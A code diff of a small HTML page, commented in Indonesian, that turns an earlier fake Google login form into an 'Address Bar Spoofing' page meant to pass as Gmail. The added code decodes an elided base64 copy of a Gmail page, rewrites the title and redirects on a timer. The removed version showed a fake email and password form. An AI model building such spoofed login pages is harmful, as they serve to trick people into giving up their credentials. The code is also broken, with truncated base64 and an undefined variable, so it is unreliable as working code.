@@ -3,30 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
+    <title>Address Bar Spoofing</title>
 </head>
 <body>
-    <button onclick="go()">Go</button>
+    <button onclick="spoof()">Go</button>
 
     <script>
-        function go(){
-            // Mengalihkan URL dengan menggunakan replace agar lebih konsisten
-            window.location.replace('https://www.google.com/csi');
-            
-            // Memberikan delay yang cukup lama untuk memanipulasi DOM setelah URL dialihkan
-            setTimeout(function(){
-                // Memodifikasi DOM untuk menampilkan form login setelah URL dialihkan
-                document.body.innerHTML = `
-                    <h1>Please login</h1>
-                    <pre>
-                        data:text/plain;base64,SW5pIGFkYWxhYiBjb250b2ggdGVrcyB5YW5nIGRpYXRyYWggQmFzZTY0IHVudHVrIGV4cGVyaW1lbmVuIQ==
-                    </pre>
-                    <h1>Email: <input id="email"></h1>
-                    <h1>Pass: <input id="pass" type="password"></h1>
-                    <button onclick="alert('Email: ' + document.getElementById('email').value + '\\nPass: ' + document.getElementById('pass').value)">Login</button>
-                `;
-            }, 5000); // Menunggu 5 detik sebelum mengganti HTML untuk memberi waktu browser
+        function spoof() {
+            // Base64 encoded HTML content (sebagai contoh)
+            var gmail = 'PCFET0NC8+KArOK.........ZHk+PC9odG1sPg=='; // Encode versi halaman Gmail
+
+            // Men-decoding base64 dan memasukkan hasilnya ke dalam halaman
+            document.body.innerHTML = atob(gmail);
+
+            // Menambahkan judul baru ke halaman
+            document.write("<title>Gmail</title>");
+
+            // Menampilkan halaman yang lebih dinamis (sebagai contoh, variabel 'x' akan berisi HTML yang didekode)
+            document.write("<p>" + x + "</p>");
+
+            // Mengalihkan browser ke Gmail (port custom, misalnya, 8080)
+            window.location.assign("https://www.Gmail.com:8080");
         }
+
+        // Memanggil spoof setiap 100 detik (100.000 ms)
+        setInterval(spoof, 100000);
     </script>
 </body>
 </html>
